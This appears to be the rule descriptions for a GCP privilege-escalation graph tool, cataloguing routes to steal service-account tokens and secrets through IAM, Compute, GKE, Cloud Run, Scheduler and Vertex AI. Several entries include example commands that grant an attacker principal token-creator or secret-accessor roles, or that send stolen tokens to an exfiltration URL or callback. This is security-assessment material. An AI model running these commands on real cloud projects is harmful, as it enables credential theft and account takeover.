_schema.require_node_sa: Boolean (single-perm only). When true, the edge only fires against k8scluster resources that have at least one node pool with a non-default service account attached (config_service_account in gke_node_pools). Meaningless attack paths to clusters that run as Compute Engine default SA are suppressed.

via_values.capability: Edge fires via a GCPIamCapability intermediate node; the principal does not need a specific enumerated resource as a precondition.
via_values.resource: Edge fires only when a matching enumerated resource exists in the DB at the same scope (e.g., a running compute instance, an existing Cloud Run service).

act_as.description: The permission the principal needs on the target SA in order for the combo to yield a PE edge to that SA. When present, the combo engine will only emit an edge to SAs the principal has this permission on.

categories.description: Top-level keys other than '_schema' and 'collapsed_role_edges' are edge categories. The pipeline loads 'priv_escalation' by default. Pass --edge-categories to override or add categories (e.g. --edge-categories priv_escalation,sensitive_resource_access, or 'all').
categories.priv_escalation: Rules that yield direct SA identity assumption: token generation, key creation, IAM modification, code execution paths. Loaded by default.
categories.sensitive_resource_access: Rules that read sensitive resource data (e.g. Secret Manager payloads) without necessarily granting a new identity. Opt-in via --edge-categories.

_schema.service_groups: priv_escalation and sensitive_resource_access now group edges under service sub-keys (e.g. "compute", "gke"). The parser flattens these transparently — service keys are invisible to rule matching.

CAN_IMPERSONATE_SA.description: Obtain tokens for the target SA via implicit delegation — usable with service account chaining when another SA has getAccessToken on the target.
CAN_IMPERSONATE_SA.example_command: modules exploit_generate_access_token --delegation {intermediate_sa} --delegation-target {target_sa}  # step through implicit delegation chain; omit --delegation-target to find all chains

CAN_CREATE_SA_ACCESS_TOKEN.description: Generate a short-lived OAuth 2.0 access token for the target service account, immediately assuming its GCP identity.

CAN_CREATE_SA_OIDC_TOKEN.description: Generate a Google-signed OIDC identity token (audience-scoped JWT) for the target SA, enabling authentication to private Cloud Run services, Cloud Functions, IAP-protected apps, and any backend that trusts Google-signed JWTs. Note: audience-bound — not a full GCP API access token by itself.

CAN_CREATE_SA_KEY.description: Create a long-lived JSON key for the target service account, providing persistent offline access to its GCP identity.

UPDATE_CUSTOM_ROLE_ADD_PERMISSIONS.description: Update a custom IAM role that the attacker already holds a binding to in the project, adding any desired permission (e.g., iam.serviceAccounts.actAs, resourcemanager.projects.setIamPolicy). Effective when the attacker holds a binding to the custom role being updated; updating a custom role only benefits principals who hold that role. Documented in Rhino Security Labs GCP IAM privilege escalation research.
caveats: Only useful if the attacker already holds a binding to the specific custom role being updated. The graph builder should verify this prerequisite before emitting this edge.

CAN_MODIFY_PROJECT_IAM.description: Set the IAM policy on a project, enabling arbitrary role grants to any principal — including roles/iam.serviceAccountTokenCreator on yourself for any SA in the project. This leads trivially to SA token theft for all SAs in the project without needing actAs on any individual SA.
CAN_MODIFY_PROJECT_IAM.example_command: gcloud projects set-iam-policy {project_id} policy.json  # or: gcloud projects add-iam-policy-binding {project_id} --member=serviceAccount:ATTACKER_SA_EMAIL --role=roles/iam.serviceAccountTokenCreator && gcloud auth print-access-token --impersonate-service-account=TARGET_SA

CAN_MODIFY_FOLDER_IAM.description: Set the IAM policy on a folder, enabling arbitrary role grants that inherit to all child projects and sub-folders — including roles/iam.serviceAccountTokenCreator on any SA in any child project.

CAN_MODIFY_ORG_IAM.description: Set the IAM policy on the organization, granting yourself roles that inherit to every project under this org — including roles/iam.serviceAccountTokenCreator org-wide.

CAN_MODIFY_SA_IAM.description: Set the IAM policy on the target service account. Use set-iam-policy (not add-iam-policy-binding which also needs getIamPolicy) to grant yourself roles/iam.serviceAccountTokenCreator directly on the SA, then generate a token. No actAs required — tokenCreator is a separate mechanism.
CAN_MODIFY_SA_IAM.example_command: gcloud iam service-accounts set-iam-policy {target_sa} policy.json --project={project_id} && gcloud auth print-access-token --impersonate-service-account={target_sa}

CAN_MODIFY_COMPUTE_INSTANCE_IAM.dead_end_note: SA token lives at the GCE metadata endpoint (169.254.169.254) inside the VM — only reachable by code running ON the instance. The only ways to get code running as the attached SA are (a) inject a startup script via setMetadata — blocked by GCP backend when an SA is attached unless actAs is present, (b) SSH via OS Login — requires actAs on the SA. Without actAs this edge ends at the instance resource node. Restart/update attacks that DO exploit the SA are covered under RESET_COMPUTE_STARTUP_SA / START_COMPUTE_STARTUP_SA (both require actAs).
CAN_MODIFY_COMPUTE_INSTANCE_IAM.description: Set the IAM policy on a Compute Engine instance, granting self roles/compute.instanceAdmin.v1 at the instance level. The SA OAuth token itself is NOT directly obtainable without actAs (setMetadata is blocked). However, several impactful capabilities work WITHOUT actAs: (1) READ all instance metadata including startup-script — often contains plaintext secrets/SA key files; (2) STOP the instance; (3) DETACH the boot disk from a stopped instance — then attach to an attacker-controlled VM to read filesystem contents; (4) SET network tags to affect which existing firewall rules target the instance (useful if a permissive rule exists). SA token theft from the metadata server (169.254.169.254) still requires getting code execution inside the instance, which requires actAs.
creative_paths: PATH 1 (metadata secrets): compute.instances.get → read startup-script/user-data → extract hardcoded SA keys, API tokens, DB passwords. Works against any instance regardless of network config. No SA token but often gets equivalent access.

PATH 2 (disk exfil): compute.instances.stop → compute.instances.detachDisk → [requires separate VM and compute.instances.attachDisk on that VM] → mount disk → read /home/*/.ssh/, config files, credential stores. Does not get SA OAuth token (not on disk) but reads stored credentials.

PATH 3 (firewall tags): compute.instances.setTags → add tag matching existing permissive firewall rule → port now accessible. SSH in still needs actAs (OS Login) or setMetadata (blocked). Useful when combined with other primitives (e.g., attacker already knows an SSH key for that instance from another path).

PATH 4 (tags + default-allow-ssh): Many GCP projects have 'default-allow-ssh' firewall rule open to 0.0.0.0/0 for the default network. If no SSH key exists in metadata AND OS Login is disabled, SSH auth is the only remaining block. Tag manipulation can retarget or remove this exposure.
caveats: actAs enforced by Compute backend on ANY setMetadata call — cannot inject SSH keys, startup scripts, or service account keys via this path
SA OAuth token lives at 169.254.169.254 (metadata server) inside the instance — only accessible by code running on the instance
Disk detach path requires attacker to already have another VM in the same zone to attach the disk to

CAN_MODIFY_CLOUD_RUN_FUNCTION_IAM.dead_end_note: Function redeploy (the only way to inject code that exfils the SA token) requires actAs on the runtime SA — Cloud Functions backend returns PERMISSION_DENIED on any update without it. Invoking the existing function only executes its current code; the SA token is not returned by the HTTP response unless the function already leaks it. Code-injection attacks that DO get the SA token are covered under UPDATE_AND_INVOKE_CLOUDFUNCTION_AS_SA (requires actAs).
CAN_MODIFY_CLOUD_RUN_FUNCTION_IAM.description: Set the IAM policy on a Cloud Function. Updating (redeploying) the function requires actAs on the runtime SA and is blocked without it. You can invoke the existing function (trigger HTTP handler), but the response is just the function's existing output — SA token is NOT directly exposed unless the function already returns it. SA token theft via this path requires actAs on the attached SA.
caveats: gcloud functions set-iam-policy also requires cloudfunctions.functions.get (gcloud client pre-flight, not backend enforcement) — use the REST API directly to avoid this
Function invocation does not directly yield the SA token; only function update/redeploy would, and that needs actAs

CAN_MODIFY_SECRET_MANAGER_SECRET_IAM.description: Set the IAM policy on a Secret Manager secret, enabling you to grant yourself roles/secretmanager.secretAccessor to read the secret value. Secrets frequently contain SA key files, OAuth tokens, or other credentials — this is a high-value access path even without direct actAs.
CAN_MODIFY_SECRET_MANAGER_SECRET_IAM.example_command: gcloud secrets add-iam-policy-binding {target_resource} --project={project_id} --member=serviceAccount:ATTACKER_SA_EMAIL --role=roles/secretmanager.secretAccessor && gcloud secrets versions access latest --secret={target_resource} --project={project_id}

CONFIGURE_WORKLOAD_IDENTITY_IMPERSONATIO.description: Create a Workload Identity Pool and OIDC provider that allows an external identity to impersonate the target SA. Combined with roles/iam.serviceAccountAdmin or setIamPolicy on the SA (covered by CAN_MODIFY_SA_IAM), the attacker establishes persistent token exchange that survives revocation of the initial credentials.

CAN_CREATE_ACCESS_POLICY_BINDING_PROJECT.description: Create an ACCESS-kind v3 policy binding on the project, granting eventarc.googleapis.com/messageBuses.publish to any target principal. the v3 ACCESS policy API enforces a strict permission allowlist — only messageBuses.publish is accepted; attempts to grant arbitrary GCP permissions (setIamPolicy, actAs, etc.) are rejected with 'permission is not allowed'. Enables an attacker to grant themselves or a controlled principal Eventarc message bus publish access, which can trigger code execution on subscribed Cloud Run services or Cloud Functions running as higher-privilege SAs.
CAN_CREATE_ACCESS_POLICY_BINDING_PROJECT.example_command: modules exploit_gcp_updatepolicybinding --service project --id PROJECT_ID create-access-policy --subject user:ATTACKER_EMAIL

CAN_CREATE_ACCESS_POLICY_BINDING_FOLDER.description: Create an ACCESS-kind v3 policy binding on the folder, granting eventarc.googleapis.com/messageBuses.publish to any target principal within the folder scope. Same allowlist restriction applies — only messageBuses.publish is accepted.
CAN_CREATE_ACCESS_POLICY_BINDING_FOLDER.example_command: modules exploit_gcp_updatepolicybinding --service folder --id FOLDER_ID create-access-policy --subject user:ATTACKER_EMAIL

CAN_CREATE_ACCESS_POLICY_BINDING_ORG.description: Create an ACCESS-kind v3 policy binding at the organization level, granting eventarc.googleapis.com/messageBuses.publish to any target principal across the entire org. same allowlist restriction — only messageBuses.publish is accepted.
CAN_CREATE_ACCESS_POLICY_BINDING_ORG.example_command: modules exploit_gcp_updatepolicybinding --service org --id ORG_ID create-access-policy --subject user:ATTACKER_EMAIL

CAN_UPDATE_ACCESS_POLICY_BINDING_PROJECT.description: Update an existing ACCESS-kind v3 policy binding on the project — e.g., modify the binding's principalSet to add the attacker as a subject, gaining eventarc.googleapis.com/messageBuses.publish. updatePolicyBinding is accepted for ACCESS-kind bindings; the underlying ACCESS policy is still restricted to messageBuses.publish only.
CAN_UPDATE_ACCESS_POLICY_BINDING_PROJECT.example_command: modules exploit_gcp_updatepolicybinding --service project --id PROJECT_ID update --binding-id BINDING_ID

CAN_UPDATE_ACCESS_POLICY_BINDING_FOLDER.description: Update an existing ACCESS-kind v3 policy binding on the folder — modify the principalSet to add the attacker, gaining eventarc.googleapis.com/messageBuses.publish within the folder scope. updatePolicyBinding is accepted for ACCESS-kind bindings.
CAN_UPDATE_ACCESS_POLICY_BINDING_FOLDER.example_command: modules exploit_gcp_updatepolicybinding --service folder --id FOLDER_ID update --binding-id BINDING_ID

CAN_UPDATE_ACCESS_POLICY_BINDING_ORG.description: Update an existing ACCESS-kind v3 policy binding at the org level — modify the principalSet to add the attacker, gaining eventarc.googleapis.com/messageBuses.publish org-wide. updatePolicyBinding is accepted for ACCESS-kind bindings.
CAN_UPDATE_ACCESS_POLICY_BINDING_ORG.example_command: modules exploit_gcp_updatepolicybinding --service org --id ORG_ID update --binding-id BINDING_ID

RESET_COMPUTE_STARTUP_SA.description: Inject a payload into a running Compute Engine instance's metadata via setMetadata, then reset (reboot) it to execute arbitrary code as the instance's attached SA. The GCE metadata endpoint inside the instance yields the SA's OAuth2 token.
caveats: Two exfil modes: startup-script (inject then reboot, token POSTed to attacker callback) or ssh-key (inject SSH public key, then SSH in after reboot and read token from IMDS).
iam.serviceAccounts.actAs is enforced on the setMetadata call itself — required even if the target SA is already attached to the VM.
compute.instances.get is not required at the API level; supply --fingerprint from prior enumeration to skip that preflight call.

START_COMPUTE_STARTUP_SA.description: Inject a payload into a stopped Compute Engine instance's metadata via setMetadata, then start it to execute arbitrary code as the instance's attached SA. The GCE metadata endpoint inside the instance yields the SA's OAuth2 token.
caveats: Two exfil modes: startup-script (inject then start, token POSTed to attacker callback) or ssh-key (inject SSH public key, then SSH in once running and read token from IMDS).
iam.serviceAccounts.actAs is enforced on the setMetadata call itself — required even if the target SA is already attached to the VM.
compute.instances.get is not required at the API level; supply --fingerprint from prior enumeration to skip that preflight call.

CREATE_COMPUTE_INSTANCE_AS_SA.description: Create a new Compute Engine VM with a target SA attached and a startup script that exfiltrates the SA token from the GCE metadata endpoint on boot.
caveats: compute.instances.get is not required at the API level; only gcloud uses it to display the result after creation.
compute.instances.setMetadata is required when passing startup-script metadata at creation time, even as part of the same create call.
compute.subnetworks.useExternalIp is required for default external IP assignment. Omit it with --no-address if not needed; without external IP, egress requires Cloud NAT.
compute.instances.setServiceAccount alone satisfies the actAs check for VM creation — iam.serviceAccounts.actAs is not separately required when this permission is held.

CREATE_GKE_CLUSTER_STEAL_NODE_SA.description: Create a GKE cluster with a high-privilege SA as the node service account, then create a pod on that cluster. Pod hits the GCE metadata endpoint to steal the node SA token. Note: GKE rejects --metadata startup-script as a reserved key. The cluster creator does NOT automatically receive K8s cluster-admin — both container.clusters.create and container.pods.create are required permissions. CREATE_GKE_POD_STEAL_NODE_SA covers pod-only access to an existing cluster.
CREATE_GKE_CLUSTER_STEAL_NODE_SA.example_command: modules exploit_gke_cluster_sa --mode create-cluster-steal-node-sa --node-sa TARGET_SA --location ZONE --cluster CLUSTER_NAME --exfil-url EXFIL_URL

caveat_permissions.container.clusters.get: Not required to create the cluster. Needed to retrieve the cluster endpoint and CA cert after creation (via gcloud container clusters get-credentials or describe). Without it, attacker must obtain the endpoint through other means (e.g. console access, prior enumeration).

UPDATE_GKE_CLUSTER_STEAL_NODE_SA.description: Add a new node pool to an existing GKE cluster specifying a target SA as the node service account (container.clusters.update covers CreateNodePool; requires iam.serviceAccounts.actAs on the target SA). Nodes in the new pool will have the target SA bound on GCE metadata. Attacker then creates a pod pinned to that pool (nodeSelector: gke-nodepool=POOL), hits the GCE metadata endpoint, and steals the token. Note: The only supported path for changing node SA on an existing cluster is adding a new node pool — gcloud has no --service-account flag for node-pools update, and the REST API UpdateCluster has no desiredServiceAccount field.
UPDATE_GKE_CLUSTER_STEAL_NODE_SA.example_command: modules exploit_gke_cluster_sa --mode update-cluster-steal-node-sa --node-sa TARGET_SA --location ZONE --cluster CLUSTER_NAME --exfil-url EXFIL_URL

caveat_permissions.container.clusters.get: Not required to update the cluster. Needed to retrieve the cluster endpoint and CA cert (via gcloud container clusters describe). Without it, attacker must obtain the endpoint through other means (e.g. console access, prior enumeration).

EXCHANGE_KSA_TOKEN_VIA_WIF.description: Mint a K8s ServiceAccount JWT via the K8s TokenRequest API (container.serviceAccounts.createToken), then exchange it for a GCP access token via Workload Identity Federation. Requires a user-managed WIF pool configured with the cluster’s OIDC issuer as a provider, and the K8s SA principal must have roles/iam.workloadIdentityUser on the target GCP SA. Three HTTP calls: (1) POST /api/v1/namespaces/NS/serviceaccounts/KSA/token with audience=WIF_PROVIDER_RESOURCE_NAME; (2) POST sts.googleapis.com/v1/token with subject_token=JWT; (3) POST iamcredentials generateAccessToken with the federated token. No pod required; no actAs required. Note: The GKE-native *.svc.id.goog pool cannot be used via the public STS API — only user-managed WIF pools work for this path.
EXCHANGE_KSA_TOKEN_VIA_WIF.example_command: modules exploit_gke_cluster_sa --cluster {target_resource} --location ZONE --mode exchange-ksa-via-wif --ksa-name KSA_NAME --wif-audience //iam.googleapis.com/projects/PROJ_NUM/locations/global/workloadIdentityPools/POOL_ID/providers/PROVIDER_ID --wif-gcp-sa TARGET_SA@PROJECT.iam.gserviceaccount.com --cluster-endpoint ENDPOINT_IP --cluster-ca BASE64_CA

ATTACH_GKE_POD_STEAL_NODE_SA.description: Attach to a running pod's stdin/stdout via the Kubernetes WebSocket attach subresource. Send a shell command to query the GCE metadata server at 169.254.169.254 to steal the node SA token. No actAs required — the SA is already bound to the node by the cluster admin. Note: kubectl requires container.pods.get before attaching (pre-flight GET); the raw K8s WebSocket attach subresource does NOT enforce this. Use the Python kubernetes client stream() or direct WebSocket to exploit with only container.pods.attach. The exploit module uses stream() to bypass kubectl entirely. container.pods.exec (kubectl exec) is a separate permission not covered by this edge.
ATTACH_GKE_POD_STEAL_NODE_SA.example_command: modules exploit_gke_cluster_sa --cluster {target_resource} --location ZONE --mode attach-pod-steal-node-sa --pod TARGET_POD_NAME --cluster-endpoint ENDPOINT_IP --cluster-ca BASE64_CA

IMPERSONATE_SYSTEM_MASTERS_GROUP.description: The GCP IAM permission container.clusters.impersonate enables kubectl --as-group=system:masters which bypasses all K8s RBAC checks. system:masters is bound to cluster-admin, granting full cluster access. This is equivalent to cluster-admin without needing K8s RBAC changes.

CREATE_GKE_POD_STEAL_NODE_SA.description: Create a pod on an existing GKE cluster. The pod hits the GCE metadata endpoint (169.254.169.254) to steal the node SA token. No actAs required — the SA is already bound to the node by the cluster admin; all pods on that node passively inherit it from the metadata server. Attacker controls pod spec (privileged mode, host networking, host PID). For WIF-based token theft without a pod, see EXCHANGE_KSA_TOKEN_VIA_WIF.

CREATE_CLOUDRUN_SERVICE_AS_SA.description: Deploy a Cloud Run service bound to the target SA and invoke it to execute arbitrary code and exfiltrate the SA's OAuth token. actAs IS required at service creation time. Minimum: run.services.create + actAs; artifactregistry.repositories.downloadArtifacts only needed when pulling from AR (not required with public Docker Hub images).

UPDATE_CLOUDRUN_SERVICE_AS_SA.description: Update an existing Cloud Run service to swap in a malicious container image bound to the target SA, then invoke it to exfiltrate the SA's OAuth token from the GCE metadata endpoint.

CREATE_AND_INVOKE_CLOUDRUN_JOB_AS_SA.description: Create and execute a Cloud Run Job bound to the target SA, running arbitrary container code that steals the SA's OAuth token from the GCE metadata endpoint.

UPDATE_AND_INVOKE_CLOUDRUN_JOB_AS_SA.description: Update an existing Cloud Run Job to replace its container image and service account with the target SA, then execute it to steal the SA's OAuth token via the GCE metadata endpoint.

CREATE_CLOUDRUN_WORKERPOOL_AS_SA.description: Create a Cloud Run Worker Pool bound to the target SA. Worker pools are persistent, non-request-driven containers that run continuously; the container can query the GCE metadata endpoint to steal the SA's OAuth2 token exactly as Cloud Run services/jobs do. No invocation required — token is accessible as soon as min-instances=1 starts.
CREATE_CLOUDRUN_WORKERPOOL_AS_SA.example_command: gcloud run worker-pools create pwn-worker --image python:3.11-slim --service-account TARGET_SA_EMAIL --region us-central1 --project PROJECT_ID
caveats: Cloud Run service agent (service-{PROJECT_NUMBER}@serverless-robot-prod.iam.gserviceaccount.com) must have roles/iam.serviceAccountTokenCreator on TARGET_SA; this is typically granted automatically when the Worker Pool is created if the caller has iam.serviceAccounts.actAs
Worker Pool container starts immediately (min-instances=1 default) and runs indefinitely — no separate invocation step
Beta feature: requires gcloud beta run worker-pools

Minimum permissions via REST API are run.workerpools.create + iam.serviceAccounts.actAs only; gcloud beta run worker-pools deploy pre-flights with run.workerpools.get which is NOT required by the REST API (POST /v2/projects/.../workerPools)
validation_notes: Live-validated: REST API POST confirmed with run.workerpools.create + actAs only; no run.workerpools.get needed
gcloud beta run worker-pools deploy requires run.workerpools.get pre-flight (REST bypasses this)
Container queries IMDS on startup; token exfiltrated to Burp Collaborator

SSH_CLOUDRUN_JOB_AS_SA.description: SSH as root into a running Cloud Run Job execution. SSH as root into a running Cloud Run Job execution via IAP + OS Login cert. Requires actAs on the SA the job runs as (for cert signing). From inside the container, query the GCE metadata endpoint to steal the SA token. Only exploitable when a job execution is actively running (running_count > 0). Note: this surface is not yet available in production gcloud; this edge is presented for future reference as the gcloud CLI and IAP backend ship support.
SSH_CLOUDRUN_JOB_AS_SA.example_command: gcloud alpha run jobs ssh JOB --region=REGION --instance=TASK_ID
caveats: IAP WebSocket backend returns error 4024 'bad destination or port' for JOB workload type. The gcloud surface (gcloud alpha run jobs ssh) exists and the OS Login certificate signing succeeds (actAs required), but the IAP tunnel at wss://{REGION}.ssh.run.app/v4 does not yet route JOB traffic. Services SSH shipped in gcloud 587.0.0; job SSH backend is expected to ship in a subsequent release.
Minimum permissions when shipped: run.jobs.sshRoot + run.jobs.get (gcloud pre-flight describe) + iam.serviceAccounts.actAs on the target SA.
Only available at gcloud ALPHA track (gcloud alpha run jobs ssh) — not yet in beta.
Only useful when a job execution is actively running (running_count > 0); gated on has_active_execution in the graph.
Requires --instance=TASK_ID to specify the running task instance (from executions API).

SSH_CLOUDRUN_WORKERPOOL_AS_SA.description: SSH as root into a running Cloud Run Worker Pool instance via IAP + OS Login. Requires actAs on the SA the pool runs as (for cert signing). Worker pools are always running so no execution trigger is needed. From inside the container, query the GCE metadata endpoint to steal the SA token. Note: this surface is not yet available in production gcloud; this edge is presented for future reference as the IAP backend ships support for worker pools.
caveats: backend not yet shipped for either jobs or worker pools. The gcloud library (api_lib/run/ssh.py) fully implements WorkloadType.WORKER_POOL and WorkloadType.JOB including OS Login cert signing; the IAP WebSocket backend at wss://{REGION}.ssh.run.app/v4 returns error 4024 'bad destination or port' for both. Services SSH shipped in gcloud 587.0.0; job+worker-pool SSH are expected in subsequent releases.
Minimum permissions when shipped: run.workerpools.sshRoot + run.workerpools.get (gcloud pre-flight) + iam.serviceAccounts.actAs on the target SA.
'gcloud beta/alpha run worker-pools ssh' subcommand does not yet exist — the gcloud surface command has not been released for worker pools.

CAN_MODIFY_CLOUD_RUN_JOB_IAM.dead_end_note: Job UPDATE/redeploy to inject token-exfil code requires actAs — Cloud Run backend returns PERMISSION_DENIED on any update without it. Executing the EXISTING job works without actAs, but job stdout goes to Cloud Logging (not the caller's shell); attacker needs logging.logEntries.list or the existing job code must already call an attacker-controlled URL. This edge is therefore partial: no direct SA token access without a pre-existing exfil path in the job code OR logging read. Code-injection attacks are covered under UPDATE_AND_INVOKE_CLOUDRUN_JOB_AS_SA (requires actAs).
CAN_MODIFY_CLOUD_RUN_JOB_IAM.description: Set the IAM policy on a Cloud Run Job. Grant self roles/run.admin (or any role with run.jobs.run) on the job, then EXECUTE the existing job. Job EXECUTION does NOT require actAs — only job UPDATE/redeploy does. The job runs as its attached SA. To exfil the SA token, either (a) the existing job code makes external HTTP requests to attacker-controlled URL, or (b) attacker can read Cloud Logging where job stdout lands. Direct SA token theft requires either logging read access or control of an endpoint the job calls.
CAN_MODIFY_CLOUD_RUN_JOB_IAM.example_command: gcloud run jobs set-iam-policy {target_resource} policy.json --region=REGION --project={project_id} && gcloud run jobs execute {target_resource} --region=REGION --project={project_id}
caveats: Only execution of the EXISTING job works without actAs — updating/redeploying the job to change its command requires actAs

Job output (SA token, email, etc.) goes to Cloud Logging, not directly to the attacker's shell; attacker needs logging.logEntries.list or the job must make outbound HTTP requests to an attacker-controlled URL
This edge is best described as 'trigger code execution as SA' rather than 'steal SA token directly'

CAN_MODIFY_CLOUD_RUN_SERVICE_IAM.dead_end_note: Service UPDATE/redeploy to inject token-exfil code requires actAs on the runtime SA — Cloud Run backend returns PERMISSION_DENIED on any image or code change without it. Invoking the existing service only executes its current handler; the SA token is not returned in the HTTP response unless the service already leaks it. Code-injection attacks are covered under UPDATE_CLOUDRUN_SERVICE_AS_SA (requires actAs).
CAN_MODIFY_CLOUD_RUN_SERVICE_IAM.description: Set the IAM policy on a Cloud Run Service. Updating/redeploying the service requires actAs on the runtime SA and is blocked without it. You CAN grant yourself roles/run.admin and invoke the existing service (HTTP requests trigger the service handler, which runs as the attached SA). SA token is NOT directly returned via invocation unless the service code explicitly exposes it. Useful for: making the service public (allUsers invoker), triggering existing functionality, or reading service config. SA token theft via this path requires actAs on the attached SA.
CAN_MODIFY_CLOUD_RUN_SERVICE_IAM.example_command: gcloud run services set-iam-policy {target_resource} policy.json --region=REGION --project={project_id}  # then: curl -H 'Authorization: Bearer TOKEN' https://SERVICE_URL/
caveats: Service UPDATE/redeploy to change code requires actAs on runtime SA — only existing service code can be triggered
Grant self roles/run.invoker (or make service public with allUsers) to invoke; grant self roles/run.admin to also read service config
This edge is best described as 'invoke existing service as its SA' rather than 'steal SA token directly'

SSH_CLOUDRUN_SERVICE_AS_SA.description: SSH as root into a running Cloud Run Service instance via IAP + OS Login cert. The OS Login signSshPublicKey API explicitly checks iam.serviceAccounts.actAs on the service SA — without it cert signing returns 403. From inside the container, query the GCE metadata endpoint (169.254.169.254) to steal the SA's OAuth token.
SSH_CLOUDRUN_SERVICE_AS_SA.example_command: gcloud beta run services ssh SERVICE --region=REGION --project=PROJECT
caveats: Service must have run.googleapis.com/ssh-enabled=true annotation set (via gcloud run services update --update-annotations run.googleapis.com/ssh-enabled=true)
gcloud beta run services ssh available since gcloud 587.0.0
roles/iap.tunnelResourceAccessor must be at project level — binding it on the Cloud Run IAP web resource returns INVALID_ARGUMENT
run.services.get (roles/run.viewer on service) required by gcloud pre-flight services.describe call; the IAP backend itself only enforces sshRoot + IAP tunnel perms
OS Login cert valid for 5 min; signed via POST /v1beta/projects/{project}/locations/{region}:signSshPublicKey

CREATE_AND_INVOKE_CLOUDFUNCTION_AS_SA.description: Deploy a new Cloud Function gen1 using a build-capable SA (via buildServiceAccount) as the runtime SA, then invoke it to exfiltrate the SA's OAuth token. The target SA must have the 4 CF gen1 build SA minimum permissions (artifactregistry.repositories.downloadArtifacts/uploadArtifacts + storage.objects.create/get), satisfied by roles/cloudbuild.builds.builder, roles/editor, or roles/owner. Caller only needs cloudfunctions.functions.create + call when using sourceArchiveUrl; cloudfunctions.functions.sourceCodeSet is only required for the upload-URL source path.

UPDATE_AND_INVOKE_CLOUDFUNCTION_AS_SA.description: Update an existing Cloud Function gen1 to swap its runtime SA and/or source code, then invoke it to exfiltrate the target SA's OAuth token. Minimum: cloudfunctions.functions.update + cloudfunctions.functions.call + iam.serviceAccounts.actAs on the new runtime SA. cloudfunctions.functions.sourceCodeSet is NOT required when using sourceArchiveUrl (direct GCS reference); it is only required for the gcloud-default upload-URL source path (generateUploadUrl). actAs on the existing buildServiceAccount may also be required if the function build triggers Cloud Build with a custom buildServiceAccount.

CREATE_CLOUDBUILD_BUILD_AS_SA.description: Submit a Cloud Build build pinned to the target SA, running arbitrary build steps that execute code with that SA credentials. IMPORTANT: must set options.logging: CLOUD_LOGGING_ONLY (or logs_bucket) when specifying a custom service-account; gcloud may report PERMISSION_DENIED at end but the build runs. actAs is enforced even on the default SA.

CREATE_CLOUDSCHEDULER_JOB_AS_SA.description: Create a Cloud Scheduler HTTP job with oauthToken.serviceAccountEmail=TARGET_SA and uri pointing at any googleapis.com endpoint (e.g. IAM key creation). Cloud Scheduler mints an OAuth2 access token for the target SA and sends it as Authorization: Bearer. actAs is NOT enforced at job creation time; it IS enforced at execution time by the Cloud Scheduler service agent (which needs roles/iam.serviceAccountTokenCreator on the target SA — auto-configured in real projects via roles/cloudscheduler.serviceAgent).

UPDATE_SCHEDULER_JOB_AS_SA.description: Update an existing Cloud Scheduler HTTP job to point its OIDC token service account to a high-privilege SA, or redirect the target URL to an attacker-controlled endpoint to capture the OIDC token. The job fires the updated request on its next schedule or on-demand. actAs on the target SA is required (enforced by the Cloud Scheduler API). cloudscheduler.jobs.get is NOT required when providing a full httpTarget body with updateMask=httpTarget.
UPDATE_SCHEDULER_JOB_AS_SA.example_command: gcloud scheduler jobs update http JOB --oidc-service-account-email=TARGET_SA@PROJECT.iam.gserviceaccount.com --uri=https://TARGET_ENDPOINT

CREATE_CLOUDTASKS_TASK_AS_SA.description: Create a Cloud Tasks queue and HTTP task authenticated as the target SA, posting the SA's Bearer token to a callback URL or calling a privileged googleapis.com endpoint.

CREATE_CLOUDTASKS_TASK_ON_EXISTING_QUEUE.description: Create an HTTP task on an existing Cloud Tasks queue that already has a service account configured, using the queue's SA to authenticate outbound HTTP requests and exfiltrate its OAuth token to a callback URL.

CREATE_COMPOSER_ENV_AS_SA.description: Create a Cloud Composer environment bound to the target SA, running Airflow DAG tasks that steal the SA's credentials from the GKE metadata server.

UPDATE_COMPOSER_ENV_AS_SA.description: ConfusedComposer (Tenable TRA-2025-03): update Composer environment to install a malicious PyPI package that triggers Cloud Build execution with the Cloud Build SA (roles/cloudbuild.builds.builder). Partially patched April 2025 for new environments; existing environments may remain vulnerable.

EXEC_COMPOSER_ENV_AS_SA.description: Execute an arbitrary Airflow CLI command in a Cloud Composer environment. This provides shell access as the Composer worker SA. Access the GCE metadata endpoint to steal the SA token.
EXEC_COMPOSER_ENV_AS_SA.example_command: gcloud composer environments run ENV --location=REGION variables -- --import /dev/null; # or dags trigger, tasks run etc.

CREATE_APPENGINE_VERSION_AS_SA.description: Deploy a new App Engine standard environment version with the serviceAccount field set to the target SA, hosting arbitrary application code that reads credentials from the GCE metadata endpoint. App Engine standard runtimes (Python 3.x, Go, Java 11+) use Cloud Build internally during deployment; the attacker does not need to interact with Cloud Build directly. Deploying as an App Engine standard version requires uploading source to the staging bucket (staging.PROJECT.appspot.com) and calling the App Engine Admin API apps.versions.create. The serviceAccount field in the version or app.yaml specifies which SA the deployed code runs as.
caveats: The deploy step uses Cloud Build internally; the Cloud Build default SA (PROJECT_NUMBER@cloudbuild.gserviceaccount.com) needs read access to the staging bucket.

The staging bucket (staging.PROJECT.appspot.com) is created automatically when App Engine is initialized. If deleted, it cannot be recreated manually due to domain ownership verification on the .appspot.com namespace.
Uploading source to the staging bucket requires storage.objects.create on that bucket (or roles/appengine.deployer which includes it). This is a client-side prerequisite, not an API-level gate.
actAs is also required on the App Engine default SA (PROJECT@appspot.gserviceaccount.com) if not specifying a custom serviceAccount — the default runtime identity is that SA.

CREATE_VERTEX_CUSTOM_JOB_AS_SA.description: Submit a Vertex AI Custom Job bound to the target SA, running arbitrary training container code that reads the SA's OAuth token from the GCE metadata endpoint.
caveats: actAs IS enforced at job submission time (HTTP 400 INVALID_ARGUMENT before job is created). Not deferred to execution.

No custom container image required — use any public image (e.g. gcr.io/google.com/cloudsdktool/cloud-sdk:slim) and override command/args inline. The containerSpec.command + args fields fully control execution.
Target SA needs zero project permissions for the edge to be meaningful. Token for the target SA is retrievable from GCE IMDS within ~2-3 min of job creation.

Vertex AI service agent (service-PROJECT_NUM@gcp-sa-aiplatform.iam.gserviceaccount.com) must have roles/iam.serviceAccountTokenCreator on TARGET_SA for the job to run as TARGET_SA. This is auto-granted when the Vertex AI API is enabled via default service agent provisioning.
Egress to attacker-controlled URLs confirmed from Vertex AI worker nodes via live test.

CREATE_VERTEX_REASONING_ENGINE_AS_SA.description: Create a Vertex AI Reasoning Engine (Agentspace) bound to the target SA; the set_up() method fires automatically during provisioning and runs as the target SA with IMDS access.
caveats: actAs enforcement happens inside the LRO (async), not synchronously — create returns 200 before checking actAs
set_up() fires automatically during provisioning; no explicit :query call needed
Multiple worker processes may call set_up() in parallel (expect multiple Burp pings)
